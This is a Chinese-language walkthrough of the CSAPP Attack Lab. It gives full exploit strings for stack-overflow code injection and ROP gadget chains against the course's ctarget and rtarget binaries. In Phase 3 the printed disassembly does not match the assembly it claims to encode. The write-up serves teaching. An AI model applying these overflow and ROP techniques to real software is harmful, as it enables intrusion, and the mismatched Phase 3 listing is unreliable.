# Solution to Attack Lab

> 本文档不会详细写出和解释每一个步骤、每一个指令、每一条汇编，如有疑问请自行查阅CSAPP课本、attack lab官方handout以及Google

## Phase 1

这一关的目标是通过输入的字符串进行注入攻击，使getbuf函数执行完之后跳转到touch1函数，这就需要我们去想办法得到touch1函数的地址以及getbuf函数执行完后返回到的地址。可以使用readelf和objdump，这里选择使用readelf，因为我们不需要知道touch1函数的具体内容：

```bash
readelf -s ctarget | grep touch1
```

我们便可以得到：

```assembly
136: 0000000000401743    44 FUNC    GLOBAL DEFAULT   13 touch1
```

那么touch1函数的起始地址就是0x401743

---

接下来获取getbuf的汇编代码：

```bash
objdump -d ctarget | grep -A20 '<getbuf>:'
```

得到：

```assembly
000000000040172d <getbuf>:
  40172d:       48 83 ec 28             sub    $0x28,%rsp
  401731:       48 89 e7                mov    %rsp,%rdi
  401734:       e8 31 02 00 00          call   40196a <Gets>
  401739:       b8 01 00 00 00          mov    $0x1,%eax
  40173e:       48 83 c4 28             add    $0x28,%rsp
  401742:       c3                      ret
```

可以发现这个函数开辟了0x28即40字节的空间，这个空间就是用来读取字符串的buf，那么我们只需要填满这个空间并在此之上填入touch1函数的地址，那么getbuf函数运行结束后便会跳转到这个地址。同时注意在栈中字节是由小端法储存的，因此我们需要倒转0x401743这三个字节，于是答案可以是：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
43 17 40 00 00 00 00 00
```

可以用`./hex2raw < 1.txt | ./ctarget (-q)`来运行代码，其中“｜”之前的部分是通过重定向得出字符串，之后用pipe将结果输入到ctarget中。-q用于调试，不会向服务器发送信息，调试通过后可以去掉这个flag。

## Phase 2

这一关要求我们在执行完getbuf函数之后进入touch2函数，同时需要把touch2的参数，即%rdi设置为我们的cookie。查看一下touch2函数的地址：
```assembly
83: 000000000040176f    86 FUNC    GLOBAL DEFAULT   13 touch2
```

---

接下来我们需要想办法去把我们的汇编代码注入到被攻击目标中，汇编代码很简单：

```assembly
mov $0x67aa2160, %rdi
push $0x40176f
ret
```

其中第一行是把cookie存入%rdi中，第二行是把touch2的地址压入栈中，最后ret则会跳转到这个地址。

---

为了得到16进制表示，我们可以运用一个小技巧，即用`gcc -c`命令把汇编用assembler转为目标文件之后再使用`objdump -d`，从而得到我们需要的十六进制表示：
```assembly
48 c7 c7 60 21 aa 67    mov    $0x67aa2160,%rdi
68 6f 17 40 00          push   $0x40176f
c3                      ret
```

---

接下来就要解决注入字符串的最终形式，首先我们知道这个字符串应是48个字节长度，其中需要包含这段汇编代码以及跳转的目标地址（即第一条mov指令的地址）。于是我们需要用到栈上的地址来进行跳转，可以使用gdb去获取栈上地址，经过一些计算可以得到我们的注入字符串的十六进制表示：

```
48 c7 c7 60 21 aa 67
68 6f 17 40 00
c3
00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
98 c7 60 55 00 00 00 00
```

成功通过

## Phase 3

这一关卡的任务是要将我们构建的一个字符串去与cookie进行比较，比较的方式由hexmatch函数指出，这里有必要贴上hexmatch函数：

```C
int hexmatch(unsigned val, char *sval) { // val对应cookie，*sval对应我们输入的字符串
  char cbuf[110];
  char *s = cbuf + random() % 100;
  sprintf(s, "%.8x", val);
  return strncmp(sval, s, 9) == 0;
}
```

其中random、sprintf、strncmp函数的作用请自行查阅，整体的逻辑是：将cookie这一字符串转化为ascii码16进制表示的字符串。虽然s字符串在栈中的位置是不确定的，但是在strncmp函数是将sval和s做比较，因此无需担心目标字符串不一样的可能性，我们只需要知道cbuf和s可能会占据栈中的哪些位置，以及touch3和hexmatch函数被push到栈上之后栈的结构层次是什么样的，那么首先来查看一下hexmatch和touch3函数的汇编

---

```assembly
0000000000401843 <touch3>:
  401843:       53                      push   %rbx
  401844:       48 89 fb                mov    %rdi,%rbx
  401847:       c7 05 ab 2c 20 00 03    movl   $0x3,0x202cab(%rip)        # 6044fc <vlevel>
  40184e:       00 00 00 
  401851:       48 89 fe                mov    %rdi,%rsi
  401854:       8b 3d aa 2c 20 00       mov    0x202caa(%rip),%edi        # 604504 <cookie>
  40185a:       e8 66 ff ff ff          call   4017c5 <hexmatch>
  40185f:       85 c0                   test   %eax,%eax
  401861:       74 1e                   je     401881 <touch3+0x3e>
  401863:       48 89 de                mov    %rbx,%rsi
  401866:       bf e8 2e 40 00          mov    $0x402ee8,%edi
  40186b:       b8 00 00 00 00          mov    $0x0,%eax
  401870:       e8 0b f4 ff ff          call   400c80 <printf@plt>
  401875:       bf 03 00 00 00          mov    $0x3,%edi
  40187a:       e8 da 02 00 00          call   401b59 <validate>
  40187f:       eb 1c                   jmp    40189d <touch3+0x5a>
  401881:       48 89 de                mov    %rbx,%rsi
  401884:       bf 10 2f 40 00          mov    $0x402f10,%edi
  401889:       b8 00 00 00 00          mov    $0x0,%eax
  40188e:       e8 ed f3 ff ff          call   400c80 <printf@plt>
  401893:       bf 03 00 00 00          mov    $0x3,%edi
  401898:       e8 6e 03 00 00          call   401c0b <fail>
  40189d:       bf 00 00 00 00          mov    $0x0,%edi
  4018a2:       e8 39 f5 ff ff          call   400de0 <exit@plt>
```

```assembly
00000000004017c5 <hexmatch>:
  4017c5:       41 54                   push   %r12
  4017c7:       55                      push   %rbp
  4017c8:       53                      push   %rbx
  4017c9:       48 83 ec 70             sub    $0x70,%rsp
  4017cd:       41 89 fc                mov    %edi,%r12d
  4017d0:       48 89 f5                mov    %rsi,%rbp
  4017d3:       e8 78 f5 ff ff          call   400d50 <random@plt>
  4017d8:       48 89 c1                mov    %rax,%rcx
  4017db:       48 ba 0b d7 a3 70 3d    movabs $0xa3d70a3d70a3d70b,%rdx
  4017e2:       0a d7 a3 
  4017e5:       48 f7 ea                imul   %rdx
  4017e8:       48 8d 04 0a             lea    (%rdx,%rcx,1),%rax
  4017ec:       48 c1 f8 06             sar    $0x6,%rax
  4017f0:       48 89 ce                mov    %rcx,%rsi
  4017f3:       48 c1 fe 3f             sar    $0x3f,%rsi
  4017f7:       48 29 f0                sub    %rsi,%rax
  4017fa:       48 8d 04 80             lea    (%rax,%rax,4),%rax
  4017fe:       48 8d 04 80             lea    (%rax,%rax,4),%rax
  401802:       48 c1 e0 02             shl    $0x2,%rax
  401806:       48 29 c1                sub    %rax,%rcx
  401809:       48 8d 1c 0c             lea    (%rsp,%rcx,1),%rbx
  40180d:       44 89 e2                mov    %r12d,%edx
  401810:       be 8e 2e 40 00          mov    $0x402e8e,%esi
  401815:       48 89 df                mov    %rbx,%rdi
  401818:       b8 00 00 00 00          mov    $0x0,%eax
  40181d:       e8 ae f5 ff ff          call   400dd0 <sprintf@plt>
  401822:       ba 09 00 00 00          mov    $0x9,%edx
  401827:       48 89 de                mov    %rbx,%rsi
  40182a:       48 89 ef                mov    %rbp,%rdi
  40182d:       e8 fe f3 ff ff          call   400c30 <strncmp@plt>
  401832:       85 c0                   test   %eax,%eax
  401834:       0f 94 c0                sete   %al
  401837:       0f b6 c0                movzbl %al,%eax
  40183a:       48 83 c4 70             add    $0x70,%rsp
  40183e:       5b                      pop    %rbx
  40183f:       5d                      pop    %rbp
  401840:       41 5c                   pop    %r12
  401842:       c3                      ret
```

---

在touch3函数中，有这两行：

```assembly
401843:       53                      push   %rbx
40185a:       e8 66 ff ff ff          call   4017c5 <hexmatch>
```

其中`push %rbx`会把%rbx的值压入栈中，而`call 4017c5`则会在hexmatch的栈区前存下%rip的值，因此touch3函数的栈区有16字节

---

```assembly
4017c5:       41 54                   push   %r12
4017c7:       55                      push   %rbp
4017c8:       53                      push   %rbx
4017c9:       48 83 ec 70             sub    $0x70,%rsp
```

接下来是hexmatch栈区。其中三个push指令会占用24字节空间，而`sub $0x70, %rsp`会开辟112字节的空间。

---

那么在调用strncmp函数是，栈的结构应大致如下：

```assembly
    +---------------+
    |               |
    |               |
    |               |
    |     test      |
    |               |
    |               |
    |               |
    +---------------+ <- 0x5560c7c8
    |     touch3    | <- 在getbuf被调用时储存的是%rip的值
    +---------------+ <- getbuf返回后%rsp的值0x5560c7c0
    |     touch3    |
    +---------------+
    |    hexmatch   |
    +---------------+
    |    hexmatch   |
    +---------------+
    |    hexmatch   |
    +---------------+ <- 0x5560c7a0
    |               |
    |               |
    |               |
    |               |
    |               |
    +---------------+ <- %rsp 0x5560c730
```

由：

```C
char *s = cbuf + random() % 100;
```

可以知道，s的起始地址是cbuf + [0, 99]，而s的长度是8+1=9个字节（需要包括字符串结尾的00）。那么s占据的可能空间便是[0,108]。而我们需要注入的字符串的长度也是9个字节，但108+9已经超过了112字节长度的限制，因此我们不能把注入的字符串放置在这段内存中。

---

那还有哪里可以存放注入的字符串呢？首先我们不能放在地址比%rsp更低的位置，因为hexmatch中有很多函数调用，我们不知道栈会向下延伸到哪里，因此我们尝试向上覆盖掉test函数的内容，或者可以在内存中的.text区、.data区以及heap区找一个空间去存法。我使用的是覆盖test函数的内容，因为这样可以直接在注入的字符串尾部接上传入的字符串，只需要三行汇编就能解决。

---

我们需要用到的汇编代码是：

```assembly
movq $0x5560c7c8, %rdi
push $0x401843
ret
```

用同样方法得到16进制表示：
```assembly
0000000000000000 <.text>:
   0:   48 c7 c7 00 c6 60 55    mov    $0x5560c600,%rdi
   7:   48 ba 36 37 61 61 32    movabs $0x3036313261613736,%rdx
   e:   31 36 30 
  11:   48 89 17                mov    %rdx,(%rdi)
  14:   c6 47 08 00             movb   $0x0,0x8(%rdi)
  18:   68 43 18 40 00          push   $0x401843
  1d:   c3                      ret
```

于是我们注入的字符串16进制表示为：

```
48 c7 c7 c8 c7 60 55
68 43 18 40 00
c3
00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
98 c7 60 55 00 00 00 00
36 37 61 61 32 31 36 30 00
```

成功通过

## Phase 4

这一关的任务是用ROP攻击复现Phase 2的攻击，为此我们需要在gadget farm的汇编代码中寻找可以使用的代码碎片。

最为直接的方法是在栈上存入cookie然后一条`popq %rdi`命令就可以直接把数据存入%rdi中，对应的十六进制表示就是`5f c3`其中c3是ret的编码。但我们用`grep`查找汇编时没有发现这个序列，因此此路不通。

---

换一种思路，我们肯定要把栈上的内容存入寄存器中，最简单的方法肯定还是直接pop，而handout文档也说可以用两个gadget通过。因此我们可以找一个中间桥梁，找到一个存在`pop %xxx`形式的寄存器，再通过mov指令存到%rdi中，那么再用一下`grep`可以找到%rax符合我们需求的片段：

```assembly
00000000004018f2 <getval_128>:
  4018f2:       b8 58 c3 9d 21          mov    $0x219dc358,%eax
  4018f7:       c3                      ret
00000000004018de <getval_322>:
  4018de:       b8 48 89 c7 c3          mov    $0xc3c78948,%eax
  4018e3:       c3                      ret
```

---

于是我们的注入代码为：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
f3 18 40 00 00 00 00 00
60 21 aa 67 00 00 00 00
df 18 40 00 00 00 00 00
6f 17 40 00 00 00 00 00
```

成功通过

## Phase 5

这一关的目标是用ROP复现Phase 3，思路是一样的，其中唯一需要额外想到的就是相对%rsp的偏移量怎么得到，设计者非常贴心的给我们了一个很特别的函数：add_xy。这个函数可以用来进行偏移量运算，两个参数分别是%rdi和%rsi，前者存的是%rsp的值，后者存的是我们想要的偏移量，可以用pop实现。而中间的转移则需要借助其他寄存器来搭桥，其中%rsp的值必须用movq来转移，偏移量可以用movq和movl。这一过程只需要耐心即可，可以使用这一命令：

```bash
objdump -d rtarget | grep -A300 '<start_farm>' | grep -C1 '89 ce'
```

当然仅供参考，不一定是最好的

---
经过尝试后，答案如下：

```assembly
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
69 19 40 00 00 00 00 00 /* movq %rsp, %rax */
df 18 40 00 00 00 00 00 /* movq %rax, %rdi */
f3 18 40 00 00 00 00 00 /* popq %rax */
48 00 00 00 00 00 00 00 /* offset of cookie */
19 19 40 00 00 00 00 00 /* movl %eax, %edx */
42 19 40 00 00 00 00 00 /* movl %edx, %ecx */
c6 19 40 00 00 00 00 00 /* movl %ecx, %esi */
0b 19 40 00 00 00 00 00 /* add_xy */
df 18 40 00 00 00 00 00 /* movq %rax, %rdi */
43 18 40 00 00 00 00 00 /* push <touch3> to the stack> */
36 37 61 61 32 31 36 30 00 /* cookie */
```

其中有几点需要注意：

- 在找`popq %rax`(58)时，会得到：

  ```assembly
  00000000004018d1 <addval_312>:
    4018d1:       8d 87 03 58 90 c3       lea    -0x3c6fa7fd(%rdi),%eax
    4018d7:       c3                      ret    
  --
  00000000004018eb <setval_381>:
    4018eb:       c7 07 11 58 92 90       movl   $0x90925811,(%rdi)
    4018f1:       c3                      ret    
  --
  00000000004018f2 <getval_128>:
    4018f2:       b8 58 c3 9d 21          mov    $0x219dc358,%eax
    4018f7:       c3                      ret    
  --
  00000000004018ff <getval_234>:
    4018ff:       b8 11 58 c2 0e          mov    $0xec25811,%eax
    401904:       c3                      ret
  ```

  并没有直接跟有c3的选择，但是我们根据官方handout可知，0x90编码的是nop，表示***no operation***，直接让PC加1，因此第一个函数可以成为一个解

- 在找`movl %ecx, %esi`(89 ce)时，会得到以下结果：

  ```assembly
  0000000000401910 <addval_396>:
    401910:       8d 87 89 ce 28 d2       lea    -0x2dd73177(%rdi),%eax
    401916:       c3                      ret    
  --
  0000000000401924 <setval_359>:
    401924:       c7 07 89 ce c4 db       movl   $0xdbc4ce89,(%rdi)
    40192a:       c3                      ret    
  --
  0000000000401974 <addval_274>:
    401974:       8d 87 89 ce 78 d2       lea    -0x2d873177(%rdi),%eax
    40197a:       c3                      ret    
  --
  0000000000401995 <addval_109>:
    401995:       8d 87 89 ce 84 c9       lea    -0x367b3177(%rdi),%eax
    40199b:       c3                      ret    
  --
  00000000004019aa <getval_238>:
    4019aa:       b8 89 ce 28 d2          mov    $0xd228ce89,%eax
    4019af:       c3                      ret    
  --
  00000000004019c4 <setval_348>:
    4019c4:       c7 07 89 ce 20 d2       movl   $0xd220ce89,(%rdi)
    4019ca:       c3                      ret
  ```

  没有紧跟c3的代码，也没有nop，但是看一下官方handout就可以知道这一关的代码中有由2字节编码的***functional nop***，他们由andb、orb、cmpb、testb组成，对照十六进制编码就可找到他们，作为可行解



